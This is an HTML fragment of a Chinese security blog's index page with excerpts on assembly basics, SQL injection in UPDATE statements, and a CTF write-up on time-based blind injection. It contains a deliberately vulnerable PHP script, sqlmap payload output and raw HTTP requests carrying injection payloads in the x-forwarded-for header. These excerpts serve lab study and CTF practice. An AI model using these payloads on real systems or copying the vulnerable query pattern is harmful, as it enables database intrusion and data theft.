+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-12 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-12T11:12:00+08:00">2017-11-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:52" itemprop="dateModified" datetime="2022-08-08T22:27:52+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南</p>
+<h2 id="什么是汇编"><a href="#什么是汇编" class="headerlink" title="什么是汇编"></a>什么是汇编</h2><p>汇编语言是一种最接近计算机核心的编码语言。不同于任何高级语言，汇编语言几乎可以完全和机器语言一一对应。<br>汇编语言就是机器语言的一种可以被人读懂的形式，只不过它更容易记忆。</p>
+<h2 id="学习汇编语言，你需要"><a href="#学习汇编语言，你需要" class="headerlink" title="学习汇编语言，你需要"></a>学习汇编语言，你需要</h2><p>1。 胆量。不要害怕去接触那些计算机内部工作机制。<br>2。 知识。了解计算机常用的数制，特别是二进制、十六进制、八进制，以及计算机保存数据的方法。<br>3。 开放。接受汇编语言与高级语言的差异，而不是去指责它如何的不好读。<br>4。 经验。要求你拥有任意其他编程语言的一点点编程经验。<br>5。 头脑。脑子是个好东西。</p>
+<h2 id="认识处理器"><a href="#认识处理器" class="headerlink" title="认识处理器"></a>认识处理器</h2><p>汇编语言被编译成机器语言之后，将有处理器（CPU）来执行。</p>
+<h3 id="典型处理器的主要任务"><a href="#典型处理器的主要任务" class="headerlink" title="典型处理器的主要任务"></a>典型处理器的主要任务</h3><p>1。 从内存中获取机器语言指令，译码，执行。<br>2。 根据指令代码管理它自己的寄存器。<br>3。 根据指令或自己的需要修改内存的内容。<br>4。 响应其他硬件的中断请求。</p>
+<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html" class="post-title-link" itemprop="url">SQL注入学习——update注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-09 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-09T11:12:00+08:00">2017-11-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]<br>##起因<br>update操作在数据库中用来更改数据，如果遇到这样的注入点，胡乱测试一通可能会引起不可恢复的错误，所以本地搭建环境写了个简单脚本测试下sqlmap是怎么注入update语句的注入点的。</p>
+<p>##准备环境<br>###数据库设置<br>创建简单的表并插入数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `atable` (</span><br><span class="line">  `userid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `truename` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `email` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`userid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>latin1 AUTO_INCREMENT<span class="operator">=</span><span class="number">3</span> ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">INSERT</span> <span class="keyword">INTO</span> `atable` (`userid`, `truename`, `email`) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;123123&#x27;</span>),</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;111&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>###有漏洞的PHP程序<br>创建有漏洞的php程序（<code>sqli-update.php</code>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;select names utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line"><span class="variable">$truename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;truename&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$truename</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$email</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE atable set `email`=&#x27;<span class="subst">$email</span>&#x27; where `truename`=&#x27;<span class="subst">$truename</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Success!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Failed!&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">mysql_error</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;select * from atable&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rows</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQLi UPDATE&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;#&#x27;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">用户名&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;truename&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">邮  箱&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;修改&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>用<code>sqlmap</code>跑下加上<code>v 3</code>查看过程<br>  命令如下：<code>sqlmap -u &quot;http://192.168.1.110/test/sqli-update.php?truename=test&amp;email=123123&amp;submit=修改#&quot; -p truename -v 3</code></li>
+</ol>
+<p>结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &#x27;truename&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: truename (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: truename=test&#x27; RLIKE (SELECT (CASE WHEN (1387=1387) THEN 0x74657374 ELSE 0x28 END))-- yLoM&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: truename=test&#x27; AND (SELECT 5950 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT (ELT(5950=5950,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sDHA&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(&#x27;[DELIMITER_START]&#x27;,([QUERY]),&#x27;[DELIMITER_STOP]&#x27;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: truename=test&#x27; AND SLEEP(5)-- gzuL&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line">	---</span><br><span class="line">	[22:09:35] [INFO] the back-end DBMS is MySQL</span><br><span class="line">	web server operating system: Windows</span><br><span class="line">	web application technology: Apache 2.4.23, PHP 5.2.17</span><br><span class="line">	back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">	[22:09:35] [INFO] fetching database names</span><br><span class="line">	[22:09:35] [DEBUG] searching for error chunk length...</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,1024)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xlNW</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 6284 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x32,512)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EObM</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1981 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x36,256)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmF</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 4432 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,54)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UOzJ</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 8781 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZjQp</span><br><span class="line">	[22:09:35] [INFO] the SQL query used returns 4 entries</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1538 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- enAv</span><br><span class="line">	[22:09:36] [INFO] retrieved: information_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2345 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Ozef</span><br><span class="line">	[22:09:36] [INFO] retrieved: mysql</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 4469 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zwdT</span><br><span class="line">	[22:09:36] [INFO] retrieved: performance_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2893 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IOqF</span><br><span class="line">	[22:09:36] [INFO] retrieved: test</span><br><span class="line">	[22:09:36] [DEBUG] performed 9 	queries in 0.62 seconds</span><br><span class="line">	available databases [4]:</span><br><span class="line">	[*] information_schema</span><br><span class="line">	[*] mysql</span><br><span class="line">	[*] performance_schema</span><br><span class="line">	[*] test</span><br></pre></td></tr></table></figure>
+
+<p>##SQLMap的方式</p>
+<p>提取SQLMap的注入语句，可发现如下关键注入方式：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html" class="post-title-link" itemprop="url">实验吧CTF WHO ARE YOU? Write-Up</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-18 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-18T11:12:00+08:00">2017-10-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/web-sec/" itemprop="url" rel="index"><span itemprop="name">web-sec</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]<br>##介绍</p>
+<ol>
+<li>这是一道<code>Time-based Blind</code>时间盲注的题目。</li>
+<li>SQLMAP自带的脚本无法完成注入。</li>
+<li>注入点要<code>header</code>中的<code>x-forwarded-for</code>。</li>
+</ol>
+<p>##确定库数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (select count(*) from information_schema.schemata)=3 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当等于<code>3</code>的时候，响应为5秒，故数据库数量为3。<br>##确定库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (ascii(substr((select schema_name from information_schema.schemata limit 1 offset 0) from 1 for 1)))&gt;1 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>##确定表名</p>
+<p>##确定列名</p>
+<p>##查询flag<br>看到过网上一篇文章写了一个脚本来跑，但是后来自己在实验过程中发现不对，原因是原作者的<code>判断</code>条件是用<code>字符</code>来判断的，然而：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>             <span 